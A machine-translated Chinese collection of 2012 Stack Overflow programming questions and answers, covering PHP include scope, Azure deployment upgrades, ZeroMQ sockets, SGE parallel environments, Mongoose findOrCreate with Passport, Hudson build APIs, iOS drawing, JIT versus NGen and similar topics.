对于批量输入，您可以使用[System.Interactive](https://www.nuget.org/packages/System.Interactive/)[`BatchBlock`](https://docs.microsoft.com/en-us/dotnet/api/system.threading.tasks.dataflow.batchblock-1)包中的或“linqy”[`Buffer`](https://fuqua.io/Rx.NET/ix-docs/html/M_System_Linq_EnumerableEx_Buffer__1.htm)扩展方法，或包中的类似功能方法，或者手动执行。[`Batch`](https://morelinq.github.io/2.6/ref/api/html/Overload_MoreLinq_MoreEnumerable_Batch.htm)[`MoreLinq`](https://www.nuget.org/packages/morelinq/)

# php - 各种模板文件之间的 PHP 变量范围

> ID：11155087
> 
> 赞同：0
> 
> 时间：2012-06-22T11:12:03.863
> 
> 标签：php, templates, variables, scope

这是一个新手问题，我知道。

模板结构是您常用的 index.php，带有一些用于页眉/页脚等的 require_once()。

我在 index.php 的顶部定义了一个 var，位于基本 url 的任何 require_once() 之前，例如 $url = 'http://url';

然后，我想将其回显到所有模板文件、页眉/索引/页脚等中，它按预期在 index.php 中工作，但在包含的所有模板文件中都出现未定义的 var 失败。

我知道这是一个 var 范围问题，但我完全不知道如何解决它。

我知道手册说 vars 可用于包含的文件，但它们不是。这可能是我本地 PHP 安装的问题吗？

编辑：创建了几个测试文件，并且在 2 个文件之间定义了一个 var，那么为什么它们不能在我的主站点文件上工作？

任何帮助都被优雅地接受了。

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:20:35.513

如果您使用函数或方法（类中的函数），那么您需要`global $variable`在函数内部进行。否则您将无法访问它，您也可以将其定义为常量。常量始终是全局的。

```
define('MYURL', $url); 
```

如果您还没有这样做，您可能想要使用 PHP 框架。

# azure - 使用 REST API 升级部署到托管服务的应用程序

> ID：11155088
> 
> 赞同：1
> 
> 时间：2012-06-22T11:12:13.673
> 
> 标签：azure, azure-configuration

想知道如何使用 REST API 在托管服务上升级部署应用程序的单个角色。假设我有 2 个 Web 角色和 1 个工作角色，我只想更新/升级 2 个中的一个 webrole。我知道我们可以做到 Azure 管理门户。

还想知道 Azure 中的回滚是如何工作的。如果我想将部署应用程序回滚到以前的状态，我可以回滚吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:13:21.420

@Sandrino 的好回答。只是想稍微扩展一下就地更新。**升级部署**REST API 调用是您用于更新角色的方法。正如 Sandrino 指出的那样，您仍然需要向上推送一个新的部署包（其中包括所有角色），但是您可以通过指定`RoleToUpgrade`元素的角色名称来指定仅升级整个包中的单个角色。

请参阅有关升级部署 API 调用的[MSDN 参考文章。](http://msdn.microsoft.com/en-us/library/ee460793.aspx)

编辑：所有 REST API 也可通过 PowerShell cmdlet 获得（可[在此处](https://www.windowsazure.com/en-us/manage/downloads/)下载）。看一下`Set-AzureDeployment`，它有一个**Upgrade**参数集。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T11:28:05.017

您无法使用服务管理 API 修改角色数量。这只能通过进行新的部署来实现（这可以使用 API 实现）。

您唯一能做的就是使用**ChangeConfiguration**请求修改实例数量：[更改部署配置](http://msdn.microsoft.com/en-us/library/windowsazure/ee460809.aspx)

[使用 REST API](http://msdn.microsoft.com/en-us/library/hh403977.aspx)可以将部署回滚到以前的状态。在部署新版本时，我倾向于使用 VIP 交换：

*   我将我的应用程序的新版本部署到暂存
*   我进行 VIP 交换（新版本变为生产，旧版本变为暂存）
*   我关闭了暂存版本（不删除它），这样旧版本停止处理来自队列等的消息。如果我的逻辑发生了变化。

如果我想回滚，我只需重新打开旧部署并再次进行 VIP 交换。这种工作方式有两条评论：

*   您只能“恢复”到应用程序的先前版本
*   您需要考虑到您可能已经更改了外部资源（如 SQL Azure）并且回滚应用程序可能会因为此更改而中断

**编辑：**使用指向 REST API 的链接修改了我的回滚答案

# zeromq - 使用 ZeroMQ 的建议

> ID：11155095
> 
> 赞同：13
> 
> 时间：2012-06-22T11:12:26.263
> 
> 标签：zeromq

我正在开发一个新的客户端-服务器应用程序 (.Net)，并且到目前为止一直在使用 WCF，它非常适合应用程序的请求-响应方法。然而，我被要求用基于套接字的解决方案替换它，部分是为了支持非.Net 客户端，以及未来的 pub-sub/broadcast 需求（我意识到 WCF 是有能力的，但这个决定背后还有其他驱动因素）。在编写自己的异步套接字解决方案时惨遭失败，我现在正在研究 ZeroMQ。

我的客户端应用程序有几个后台线程，它们会定期从服务器请求数据。此外，某些 UI 操作（例如，单击按钮）可以触发向服务器发送消息。WCF 使这变得简单——代码只是在单例 WCF 服务代理上调用了相关方法（实际上我使用 Castle Windsor WCF 工具，它为我提供了异步调用功能，但这可能与我的问题无关）。

我不太确定这种方法将如何转化为 ZeroMQ，尤其是在管理套接字方面——我对 ZeroMQ 非常陌生，并且仍在阅读指南。我是否正确地说每个线程都需要一个单独的套接字（即两个 b/g 线程和 UI）？套接字生命周期怎么样 - 我是在每次想要发送/接收时创建一个（可能效率低下），还是在线程启动时创建套接字并在线程的整个生命周期内重用它？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-06-26T06:44:19.747

一件事必须非常清楚。**ZMQ 套接字只能连接和对话 ZMQ 套接字。**

这意味着，如果我正在构建一个其组件相互通信的分布式应用程序，我可以自由选择任何通信方法，因为外部客户端不会暴露给它。

为这种方式选择 ZMQ 套接字是一个好主意。它允许您立即构建许多通信模式，如 req/rep、push/pull、pub/sub 等，还可以使用 ZMQ 设备构建更复杂的拓扑。

然而，当涉及外部客户时，不能掉以轻心。这将强制所有外部客户端使用可能不理想的 ZMQ 套接字。如果其中一个客户端恰好是使用您的 Web 服务的浏览器，那么您将需要通过常规客户端提供服务。

> 您的客户端应用程序是否使用常规套接字？可以重写以使用 ZMQ 套接字吗？
> 
> 如果不是，则不要将 ZMQ 套接字用于外部接口，而仅用于内部组件通信。

[编辑：进一步说明]

ZMQ 是套接字的包装器，但它做了一些很难手工完成的事情

1.  它通过同时批处理多条消息来以更高的吞吐量管理消息传递
2.  同时优化socket的使用
3.  一个socket只能向另一个socket发送消息，ZMQ socket可以连接多个ZMQ socket
4.  基于 ZMQ 套接字的解决方案可以立即利用各种模式 - REQ/REP、PUSH/PULL、PUB/SUB 等

然而，将 ZMQ 误认为是消息队列是很常见的。

1.  可用的消息队列通过实现存储队列具有其他属性，例如消息持久性和传递保证等。
2.  ZMQ 代表“零消息队列”

最近才在学习ZMQ，用起来很开心。

查看我关于 ZMQ 的迷你教程，看看使用它是否有意义：

[http://learning-0mq-with-pyzmq.readthedocs.org/en/latest/](http://learning-0mq-with-pyzmq.readthedocs.org/en/latest/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-18T00:59:27.997

关于城堡整合，看看亨利在他的叉子上做了什么：

[https://github.com/hconceicao/clrzmq2/tree/master/src/integration](https://github.com/hconceicao/clrzmq2/tree/master/src/integration)

# java - SGE：多线程 Java 代码的并行环境

> ID：11155098
> 
> 赞同：1
> 
> 时间：2012-06-22T11:12:39.420
> 
> 标签：java, multithreading, parallel-processing, sungridengine

我编写了一个多线程 java 代码，它在运行时创建 8 个线程，并且在这些线程上继续计算。我想将此作业提交到 SGE 集群，但我不确定`pe`应该选择哪个并行环境 ( )？还是我应该创建一个？我是 SGE 的新手。简单的方法是以串行模式运行它，但这效率低下。

关于创建一个`pe`，它需要在哪里创建？SGE 守护进程是否也需要这个`pe`？当我提交一个随机名称为的工作时`pe`，我得到了

```
 job rejected: the requested parallel environment "openmpi" does not exist 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:44:07.780

线程应用程序必须在单个节点上获得所有插槽。这就是为什么您需要一个`allocation_rule`设置为`$pe_slots`. 并行环境由 SGE 管理员使用`qconf -ap PE_name`. 作为用户，您只能使用 获取可用 PE 的列表，`qconf -spl`并且可以使用 查询特定 PE 的配置`qconf -sp PE_name`。您可以使用以下`(ba)sh`脚本遍历所有 PE 并查看它们的分配规则：

```
for pe_name in `qconf -spl`; do
  echo $pe_name
  qconf -sp $pe_name | grep allocation_rule
done 
```

但是您应该已经与您的 SGE 管理员交谈，而不是试图在这里证明您的离题问题。

# asp.net-mvc - appharbor 应用程序执行错误

> ID：11155104
> 
> 赞同：0
> 
> 时间：2012-06-22T11:13:19.843
> 
> 标签：asp.net-mvc, razor, appharbor

我正在尝试在 appharbor 平台上运行 asp.net mvc Web 应用程序。在部署应用程序时，出现以下错误：

```
The file '/Views/Home/Index.cshtml' has not been pre-compiled, and cannot be requested. 
```

该应用程序具有以下程序集：

```
<assemblies>
    <add assembly="System.Web.Abstractions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
    <add assembly="System.Web.Helpers, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
    <add assembly="System.Web.Routing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
    <add assembly="System.Web.Mvc, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
    <add assembly="System.Web.WebPages, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
  </assemblies> 
```

# python - 带有关联代理的 SQLAlchemy 对象的深层副本

> ID：11155106
> 
> 赞同：1
> 
> 时间：2012-06-22T11:13:20.580
> 
> 标签：python, sqlalchemy

有没有办法深度复制包含关联代理的 SQLAlchemy 类的对象实例？

例如，当对此类的实例进行深度复制时

```
class Device(Base):

    __tablename__ = 'collect_inventory'

    _id = Column('id', Integer, primary_key=True)
    _ip = Column('ip', String(15), index=True)

    fields = association_proxy("field_values", "value",
                               creator=lambda k, v:
                                       FieldValue(field=k, value=v)
                              ) 
```

我收到此错误：

```
 File "/opt/secadvisor/lib/component.py", line 198, in _deliver_mods
    receiver.receive(copy.deepcopy(data), msg_type, module_name, component)
  File "/usr/lib64/python2.6/copy.py", line 189, in deepcopy
    y = _reconstruct(x, rv, 1, memo)
  File "/usr/lib64/python2.6/copy.py", line 338, in _reconstruct
    state = deepcopy(state, memo)
  File "/usr/lib64/python2.6/copy.py", line 162, in deepcopy
    y = copier(x, memo)
  File "/usr/lib64/python2.6/copy.py", line 255, in _deepcopy_dict
    y[deepcopy(key, memo)] = deepcopy(value, memo)
  File "/usr/lib64/python2.6/copy.py", line 162, in deepcopy
    y = copier(x, memo)
  File "/usr/lib64/python2.6/copy.py", line 235, in _deepcopy_tuple
    y.append(deepcopy(a, memo))
  File "/usr/lib64/python2.6/copy.py", line 189, in deepcopy
    y = _reconstruct(x, rv, 1, memo)
  File "/usr/lib64/python2.6/copy.py", line 338, in _reconstruct
    state = deepcopy(state, memo)
  File "/usr/lib64/python2.6/copy.py", line 162, in deepcopy
    y = copier(x, memo)
  File "/usr/lib64/python2.6/copy.py", line 255, in _deepcopy_dict
    y[deepcopy(key, memo)] = deepcopy(value, memo)
  File "/usr/lib64/python2.6/copy.py", line 189, in deepcopy
    y = _reconstruct(x, rv, 1, memo)
  File "/usr/lib64/python2.6/copy.py", line 323, in _reconstruct
    y = callable(*args)
  File "/usr/lib64/python2.6/copy_reg.py", line 93, in __newobj__
    return cls.__new__(cls, *args)
TypeError: attrgetter expected 1 arguments, got 0 
```

`fields`仅在访问 association_proxy 字段（在本例中）时才会发生错误。

# node.js - 如何处理异步。护照和猫鼬的 findOrCreate 方法

> ID：11155108
> 
> 赞同：5
> 
> 时间：2012-06-22T11:13:43.023
> 
> 标签：node.js, authentication, express, mongoose, passport.js

身份验证模块“Passport”需要 FindOrCreate 方法才能进行登录。我正在使用 mongoose 以使用以下模式保存我的用户：

```
var UserSchema = new Schema({
    firstname: String,
    lastname: String,
    email: String,
    accounts: []
}); 
```

帐户数组包含代表 facebook 帐户的对象，例如`{provider: "facebook", uid: "someFacebookId"}`.

我的身份验证策略如下所示：

```
// Authentication Strategy
passport.use(new FacebookStrategy({
    clientID: CONFIG.fb.appId,
    clientSecret: CONFIG.fb.appSecret,
    callbackURL: CONFIG.fb.callbackURL
  },
  function(accessToken, refreshToken, profile, done) {
    // asynchronous verification, for effect...
    process.nextTick(function () {

      User.find({ 'accounts.uid': profile.id, 'accounts.provider': 'facebook' }, function(err, olduser) {

          if(olduser._id) {
            console.log('User: ' + olduser.firstname + ' ' + olduser.lastname + ' found and logged in!');
            done(null, olduser);
          } else {
            var newuser = new User();
            var account = {provider: "facebook", uid: profile.id};
            newuser.accounts.push(account);
            newuser.firstname = profile.name.givenName;
            newuser.lastname = profile.name.familyName;
            newuser.email = "TBD...";

            newuser.save(function(err) {
              if(err) { throw err; }
              console.log('New user: ' + newuser.firstname + ' ' + newuser.lastname + ' created and logged in!');
              done(null, newuser);
            });
          }
        });
    });
  }
)); 
```

**问题：**查询我的数据库 ( `User.find(...)`) 后，回调函数立即执行，无需等待我的数据库回答。这会导致一个未定义的`olduser`对象。因此，每次该用户尝试登录时，我都会将同一用户的副本复制到我的数据库中。

如何正确处理此异步回调？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T13:44:39.507

`User.find`返回与您的条件匹配的文档*数组。*在您的情况下，您想`User.findOne`改用，然后检查`if (olduser)...`以确定是否找到了匹配的文档。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-31T00:44:54.753

讨厌吹毛求疵，但是如果两个用户尝试同时注册，这里提到的其他方法就会中断——在您投入生产之前，您需要查看交易：[http ://www.mongodb.org/显示/DOCS/两阶段+提交](http://www.mongodb.org/display/DOCS/two-phase+commit)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T16:11:20.050

```
process.nextTick(function () {
      var query = User.findOne({ 'fbId': profile.id });
      query.exec(function (err, oldUser) {
        console.log(oldUser);
        if(oldUser) {
          console.log('User: ' + oldUser.name + ' found and logged in!');
          done(null, oldUser);
        } else {
          var newUser = new User();
          newUser.fbId = profile.id;
          newUser.name = profile.displayName;
          newUser.email = profile.emails[0].value;

          newUser.save(function(err) {
            if(err) {throw err;}
            console.log('New user: ' + newUser.name + ' created and logged in!');
            done(null, newUser);
          }); 
        }
      });
    }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-06T02:27:36.833

有一个应用程序：[mongoose-findorcreate](https://github.com/drudge/mongoose-findorcreate)

# jquery - 如何使用 jquery 从局部变量和对象中获取值

> ID：11155109
> 
> 赞同：0
> 
> 时间：2012-06-22T11:13:43.467
> 
> 标签：jquery

我有这个：

```
form = $('#<%= params[:board_id] %>');
var $parent = form.closest(".biscuit").eq(0); 
```

我想获得`form`和的值`$parent`

如果我写：

`alert($parent).value();`或者`alert(form).value();`我得到警报`[object Object]`。

如何获得`form`and的值`$parent`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T11:23:02.510

你写了：

`alert($parent).value();`或者`alert(form).value();`

相反，你应该写：

`alert( $parent.val() );`或者`alert( form.val() )`

你写的，提醒`$parent`jQuery 对象，然后尝试`value()`在结果上调用方法......

# automation - 在 Hudson 上获得最后一次成功构建

> ID：11155113
> 
> 赞同：3
> 
> 时间：2012-06-22T11:14:05.653
> 
> 标签：automation, hudson, hudson-plugins, hudson-api

我想知道是否有人知道以某种方式使用 CLI 从特定的 Hudson 工作*中获得成功的最后一个构建版本的方法或插件。*

我可以看到这个结果保存在`[DateTime]\build.xml`文件中，所以我可以写一些东西来获取结果，但想知道是否有人已经这样做了，或者知道*使用 CLI 获取这些信息的方法？*

我试图找到有关文档的信息，但无法找到答案。如果您需要更多详细信息，请告诉我。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-22T16:47:54.630

我在这里聚会有点晚了，但您也可以只使用 URL`http://localhost:8081/job/jobname/lastSuccessfulBuild`来获取最后一次成功的构建。如果您想从该页面中提取特定数据，您可以使用`http://localhost:8081/job/jobname/lastSuccessfulBuild//api`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T11:51:08.637

你可以用 XPATH 做到这一点：

```
http://localhost:8081/api/xml?depth=2&xpath=/hudson/job/name[text()="JReport2"]/../build/result[text()="SUCCESS"]/../../build[1]/number/text() 
```

在上面的示例中，我获得了名为*JReport2*的构建的最后一个成功构建号。您可以通过 WGET 或 CURL 向其发送与该 URI 等效的 HTTP GET 查询您的 Hudson 服务器。

XPath 表达式可以缩短，但在较长的形式中更容易理解发生了什么。

一般来说，`http://<hudson-server>/api/xml`在浏览器中输入并检查输出是有指导意义的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-10T10:24:18.150

正确的*xpath*为：

```
...&xpath=/hudson/job/name[text()="...name of project..."]/../build/result[text()='SUCCESS']/../number/text() 
```

但这是行不通的。

工作*xpath*如下：

```
http://HudsonServer:Port/job/..nameOfProject../lastSuccessfulBuild/api/xml?xpath=//number/text() 
```

如上所述：

```
...&xpath=/hudson/job/name[text()="JReport2"]/../build/result[text()="SUCCESS"]/../../build[1]/number/text() 
```

这不是正确的 xpath，因为`/../../build[1]/number/text()`总是给出第一个构建。

# ios - UIBezierPath 绘图问题

> ID：11155114
> 
> 赞同：2
> 
> 时间：2012-06-22T11:14:06.170
> 
> 标签：ios, cocoa-touch, core-graphics, uibezierpath

我创建了一个名为 myBezierPaths 的类，有两个类型为 UIBezierPath 和 UIColor 的成员变量，然后我尝试使用此类的对象来绘制 bezierpath，但我没有得到 bezierpath，下面是我的代码

```
//Bezierpath.h

@interface BezierPath : NSObject
{
UIBezierPath *m_bezierPath;
UIColor *m_pathColor;
}

@property (nonatomic, strong) UIBezierPath *bezierPath;
@property (nonatomic, strong) UIColor *pathColor;
@end

//drawingView.m

- (void)drawRect:(CGRect)rect
{ 
for (BezierPath *pathobj in m_pathArray) 
{ 
[pathobj.pathColor setStroke];
[pathobj.pathColor setFill];
[pathobj.bezierPath strokeWithBlendMode:kCGBlendModeNormal alpha:1.0]; 
} 
}

-(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event
{
*self.myPath = [[BezierPath alloc] init];*

myPath.bezierPath.lineWidth = 5; 
myPath.bezierPath.lineCapStyle = kCGLineCapRound;
myPath.bezierPath.flatness = 0.0;
myPath.bezierPath.lineJoinStyle = kCGLineJoinRound;
myPath.bezierPath.miterLimit = 200.0;

self.myPath.pathColor = [UIColor redColor];

UITouch *mytouch=[[touches allObjects] objectAtIndex:0]; 

[myPath.bezierPath moveToPoint:[mytouch locationInView:self]];
[m_pathArray addObject:self.myPath];
}

- (void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event
{

    UITouch *mytouch=[[touches allObjects] objectAtIndex:0];
    [self.myPath.bezierpath addLineToPoint:[mytouch locationInView:self]];    

    [self setNeedsDisplay];    
} 
```

希望我的解释清楚，等待回复

问候兰吉特

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T12:11:04.757

首先，在你的`drawRect`你实际上并没有填充形状。您确实对其进行了描边（基本上是画了一个边框），但是您需要调用`[pathObj.bezierPath fill];`以实际用颜色填充形状。

您没有显示很多代码，因此很难判断问题出在哪里。我会在`drawRect`方法中创建一个断点来确定是否所有变量都在那里。例如，您显示（我假设）是一个数组：`m_pathArray`。你确定它已经初始化了吗？您确定 的属性`BezierPath`工作正常吗？我注意到`touchesBegan`你设置`pathColor`但只能访问/读取`bezierPath`变量。那已经初始化了吗？您在哪里创建“m_bezierPath”实例变量？您是在 BezierPath`init`方法中创建它还是在访问时懒惰地实例化它？

所以这些是你可以检查的几件事。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T07:47:56.763

@Ranjit 需要一些帮助我有同样的问题......我想改变 UIbezierpath 的颜色。但是当我选择颜色时，我以前的路径也会自动用新颜色着色。

在我的第一张图片中，我画了一条线，选择的颜色是红色。但是当我选择黄色来绘制另一条线时，前一行也变为黄色。（图 2）

![在此处输入图像描述](../Images/84fbc1904e013a27a1a20f6e02919508.png)

![在此处输入图像描述](../Images/3488871ca9618805a82cd495d9939be2.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T11:45:31.973

你没有显示你的`touchesMoved`事件处理程序，但我希望这样的事情。否则，您所做的只是创建一组长度为零的路径。

```
-(void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event
{

UITouch *mytouch=[[touches allObjects] objectAtIndex:0]; 

[self.myPath.bezeirPath lineToPoint:[mytouch locationInView:self]];

} 
```

# c# - emgu 矩阵 .getCols

> ID：11155119
> 
> 赞同：1
> 
> 时间：2012-06-22T11:14:31.783
> 
> 标签：c#, matrix, emgucv

我在使用 Matrix 类型的方法 getCols() 时发现了一个问题。检查这段代码：

假设 orig 的大小为 [1000, 384] 且 numFeat 为 = 50；

```
private Matrix<float> ComputePCA(Matrix<float> orig, int numFeat)
    {
        Matrix<float> avg = new Matrix<float>(1, orig.Cols);
        Matrix<float> eigval = new Matrix<float>(orig.Cols, 1);
        Matrix<float> eigvec = new Matrix<float>(orig.Cols, orig.Cols);
        Matrix<float> featMat = new Matrix<float>(orig.Rows, numFeat);

        CvInvoke.cvCalcPCA(masterMat, avg, eigval, eigvec, Emgu.CV.CvEnum.PCA_TYPE.CV_PCA_DATA_AS_ROW);

        Matrix<float> choosenAutovec = new Matrix<float>(orig.Cols, numFeat);

        choosenAutovec = eigvec.GetCols(0, numFeat - 1);

        featMat = choosenAutovec.Transpose() * orig.Transpose();

        return featMat.Transpose();
    } 
```

在 eigvec.GetCols 之后，我想有一个大小为 [384, 50] 的变量 choosenAutovec 对吗？但我得到了一个矩阵 [384, 384] ......有什么建议只取前 50 列吗？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-16T07:56:05.010

获取前 50 列几乎是正确的，除了*numFeat*不能减少，因为**GetCols**的第二个参数中的索引是独占的。

至于矩阵大小，在调用**GetCols**之后， choosenAutovec的*Data*属性引用了与*eigvec*的类似属性相同的浮点数*组*。但是，*choosenAutovec*的索引器将像 384 x 50 矩阵一样工作。您可以通过在*featMat*赋值后设置断点来自行检查。*按照预期， featMat*的大小将是 50 x 1000。

在下面的页面中， Canming的评论中详细描述了 **GetCol**的行为（类似于**GetCols ）：** [http ://www.emgu.com/bugs/show_bug.cgi?id=19](http://www.emgu.com/bugs/show_bug.cgi?id=19)

# iphone - 如何使用 iphone 中的代码从多任务处理中杀死我的应用程序？

> ID：11155123
> 
> 赞同：0
> 
> 时间：2012-06-22T11:14:42.923
> 
> 标签：iphone, multitasking, kill

我正在寻找一种方法来使用 UI 按钮杀死我的应用程序（使用代码），并且不要让它继续执行多任务处理。我试过了： - 退出（0）；- applicationWillTerminate

但是这两种方法会杀死应用程序，但不会阻止它进行多任务处理。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T11:16:16.940

无法以编程方式从任务栏中删除您的应用程序，还请注意，如果您使用您在答案中编写的任何方法，您的应用程序将被苹果拒绝

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T11:19:13.980

奥马尔的回答是正确的（所以像往常一样，他比我快+1）。您应该让用户控制决定何时终止您的应用程序，而不是自己终止应用程序。

有一种方法可以退出似乎可以工作的应用程序，即将[“ `UIApplicationExitsOnSuspend`”键](https://developer.apple.com/library/ios/#documentation/General/Reference/InfoPlistKeyReference/Articles/iPhoneOSKeys.html)添加到应用程序的 Info.plist 文件中。当用户将应用程序置于后台（即主页按钮或来电）时，应用程序将退出。此相关问题中提供了更多信息](http://stackoverflow.com/questions/3421400/quit-app-in-ios4)。希望这可以帮助！

# highcharts - 来自 psd 的样式 Highchart 折线图

> ID：11155127
> 
> 赞同：0
> 
> 时间：2012-06-22T11:14:56.570
> 
> 标签：highcharts

我找到了一个干净简单的折线图[psd](http://www.premiumpixels.com/freebies/clean-simple-line-chart-psd/)

我想用 Highchart 库创建。

这是我此时创建的[http://jsfiddle.net/pFCgz/1/](http://jsfiddle.net/pFCgz/1/)

但我不知道如何创建像 psd 这样的 Bullon 标记。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:37:57.830

看到这个[jsFiddle](http://jsfiddle.net/wergeld/aFD6a/)。

我把颜色匹配和字体大小留给你。一般的想法是使用在[这里](http://www.highcharts.com/ref/#tooltip)找到的信息，如下所示：

```
tooltip: {
        formatter: function() {
            return '<b>' + this.x + '</b><br/>' + this.y + ' €';
        },
        backgroundColor: 'Grey',
        borderWidth: 1,
        borderColor: '#AAA',
        style: {
            fontWeight: 'bold',
            color: 'White'

        }
    } 
```

**编辑：** 所以看起来只有一些预制的点标记符号。见[这里](http://www.highcharts.com/ref/#point-marker)。当然，您可以创建自己的。或者，您可以编辑这些现有符号以实现您想要的。看[这里](http://jsfiddle.net/gh/get/jquery/1.7.1/highslide-software/highcharts.com/tree/master/samples/highcharts/plotoptions/series-marker-fillcolor/)！

# javascript - 改变一个的 改变另一个的子节点 被选中

> ID：11155135
> 
> 赞同：0
> 
> 时间：2012-06-22T11:15:25.203
> 
> 标签：javascript, dom

所以我有这些javascript代码行，我需要删除所选选择元素的所有子节点并将新的选项元素附加到它。选项元素的值存储在“personaggi”数组中。因此，对于 0,1 和 2 的“k”值，代码似乎可以正常工作。当 k=3 时，它不再正常工作，我不知道为什么。函数应该是这样的：

```
response=xmlhttp.responseText;
var personaggi=response.substr(1).split("+");
select=document.getElementById('select_personaggi');
var length=select.childNodes.length;
for(k=0;k<length;k++){ 
    select.removeChild(select.childNodes[k]); 
}
for(i=0;i<personaggi.length;i++){ 
    var option=document.createElement('option'); 
    option.setAttribute('value', personaggi[i]); 
    var text=document.createTextNode(personaggi[i]); 
    option.appendChild(text); 
    option.appendChild(text); 
    select.appendChild(option); 
} 
```

希望我很好地解释了我的问题:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:23:11.507

您基本上是在循环中从数组中删除元素......这将永远无法正常工作。数组的大小会随着时间而变化，但您会不断增加索引。

要么以相反的顺序遍历节点，要么执行以下操作：

```
while(select.firstChild) {
    select.removeChild(select.firstChild);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T11:40:01.263

处理选择选项更容易和更清洁：

```
response=xmlhttp.responseText;
var personaggi=response.substr(1).split("+");
select=document.getElementById('select_personaggi');

var length = select.options.length;
for (k = 0; k < length; k++) {
    select.options[0] = null;
}

for (i = 0; i < personaggi.length; i++) {
    select.options.add(new Option(personaggi[i], personaggi[i], true, false));
} 
```

# android - 从 Fragment 访问 Activity

> ID：11155136
> 
> 赞同：6
> 
> 时间：2012-06-22T11:15:28.297
> 
> 标签：android, android-fragments

我正在尝试从片段更改活动标题（在这种情况下，它是一个`android.support.v4.app.Fragment`）。为此，我在片段`onAttach()`上调用时将活动保存在片段上的属性中。根据文档，`onAttach()`应该在之前调用`onCreateView()`，我用它来请求一些用于填充视图的数据。当我启动网络检索线程时，我想在标题中指出这一点，所以我试图`this.activity.setTitle()`从`Fragment`. 但是，这一直在抛出`NullPointerException`. 我在这里想念什么？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-06-22T11:24:44.877

您可以使用 访问片段中的活动`getActivity()`。只要`onActivityCreated()`在 Fragment 上调用它就可以安全地调用它。在此之前，它可能不存在或尚未完全初始化。

如果您的线程在此之前开始，只需注意片段中某处的事实，并且仅在`onActivityCreated`调用后更改标题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-12-06T20:09:39.317

现在你也可以调用`requiredActivity()`那个返回`FragmentActivity`对象，如果片段不是来自一个活动，方法会抛出一个`IllegalStateException`

# .net - JIT 与 NGen 的冷启动和热启动

> ID：11155138
> 
> 赞同：2
> 
> 时间：2012-06-22T11:15:42.107
> 
> 标签：.net, jit, ngen

我想了解 JIT 和 NGen 之间的区别，请帮助我。JIT 是否缓存二进制代码？如果是，则意味着 NGen 只能提高冷运行性能。但我读过一些相反的文章：NGen 仅能显着改善热启动。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T13:43:18.587

恰恰相反。冷启动比热启动需要更长的时间，因为程序集不在文件系统缓存中，需要在磁盘上找到。这在机械磁盘驱动器上可能会很慢。NGen 会在磁盘上为每个经过 ngen 编辑的程序集创建一个*额外*的文件，这是一个包含预编译机器代码的 .ni.dll 文件。*除了*原始程序集之外，还需要找到并加载此文件，这大约使该特定程序集的冷启动成本增加了一倍。

因此，按照设计，NGen 只能可靠地改善程序的热启动，它会*恶化*冷启动的部分，使其变慢。只有在启动时抖动所花费的时间超过查找 .ni.dll 文件所需的时间时，您才会在冷启动情况下领先。这当然很难预测，因为它在很大程度上取决于磁盘性能并且很难测量，因为在开始变热之前你只有一次机会。

你必须进行实验。粗略的指导是，当程序集存储在 GAC 中并在多个进程中使用时，该程序集应该是“大量的”，并有额外的理由对 ngen 进行处理，因为这仅允许将预编译的代码加载到 RAM 中一次以用于多个进程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:12:55.227

.NET JIT 不会跨进程缓存机器代码（我怀疑出于安全性和正确性的原因 - 程序集可以更改并且可以编辑存储的机器代码。这些都是难以解决的问题）。每个进程都会重新创建机器代码。

因此，NGEN 缩短了冷启动和热启动的加载时间。

# c# - .js 文件中的 C# 变量来自服务器控件 ASP.NET 中的嵌入资源

> ID：11155145
> 
> 赞同：2
> 
> 时间：2012-06-22T11:16:18.053
> 
> 标签：c#, javascript, asp.net, variables, custom-server-controls

我正在构建具有一些资源的 ASP 服务器控件。其中之一是 .js 文件，我必须从我的 ServerControl.cs 文件中传递一个变量。

例如，我知道如何在我的资源样式文件和 javascript 文件中获取资源图像，如下所示：

```
var resourceOpen  = "<%=WebResource("PatientList.Images.DirOpen.png")%>" ;
var resourceClose = "<%=WebResource("PatientList.Images.DirClose.png")%>";

background: url('<%=WebResource("PatientList.Images.letter-bg.png")%>'); 
```

我想对我的服务器控制.cs文件中的公共变量做同样的事情假设我有

```
public string TestVariable = "It works" 
```

如何将其传递给我的资源中的 javascript 文件？

```
